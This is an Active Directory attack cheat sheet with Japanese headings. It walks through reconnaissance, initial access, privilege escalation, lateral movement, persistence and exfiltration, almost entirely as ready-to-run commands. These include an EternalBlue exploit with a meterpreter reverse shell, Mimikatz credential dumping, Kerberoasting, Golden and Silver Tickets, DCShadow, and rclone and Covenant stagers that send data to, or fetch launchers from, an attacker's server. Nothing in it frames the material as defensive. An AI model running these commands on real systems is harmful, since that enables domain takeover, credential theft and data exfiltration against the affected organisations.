### 1. 偵察
#### ツール: BloodHound, Powerview, ADExplorer
```bash
# BloodHound
Invoke-BloodHound -CollectionMethod All

# Powerview
Get-NetUser -Domain
Get-NetComputer -Domain
Get-NetGroup -Domain

# ADExplorer
ADExplorer.exe /server:<domain-controller-ip>
```

### 2. 初期アクセス
#### ツール: Metasploit, Cobalt Strike, Empire
```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit

# Cobalt Strike
beacon> powershell-import /path/to/PowerView.ps1
beacon> powershell Invoke-UserHunter

# Empire
usemodule stager/multi/launcher
set Listener http
execute
```

### 3. 権限の昇格
#### ツール: Mimikatz, Rubeus, CrackMapExec
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
cme smb <target-ip> -u <username> -p <password> --local-auth
```

### 4. 横方向の移動
#### ツール: PsExec, PowerShell Remoting, Cobalt Strike
```bash
# PsExec
PsExec.exe \\<target-ip> -u <username> -p <password> cmd

# PowerShell Remoting
Enter-PSSession -ComputerName <target-ip> -Credential <username>

# Cobalt Strike
beacon> shell psexec.exe \\<target-ip> -u <username> -p <password> cmd.exe
```

### 5. 持続性
#### ツール: Golden Ticket, Silver Ticket, DCShadow
```bash
# Golden Ticket
mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /id:<rid> /ptt" exit

# Silver Ticket
mimikatz.exe "kerberos::golden /domain:<domain> /sid:<domain-sid> /target:<target> /service:<service> /rc4:<service-hash> /user:<username> /id:<rid> /ptt" exit

# DCShadow
mimikatz.exe "lsadump::dcshadow /object:<target-user> /attribute:sidHistory /value:<sid-value>" exit
```

### 6. データの流出
#### ツール: Exfil, Rclone, Covenant
```bash
# Exfil
exfil.exe -target <target-directory> -destination <your-server>

# Rclone
rclone copy <local-directory> <remote-name>:<remote-directory>

# Covenant
Stager PS
Invoke-Stager -Uri http://<your-covenant-server>/launcher
```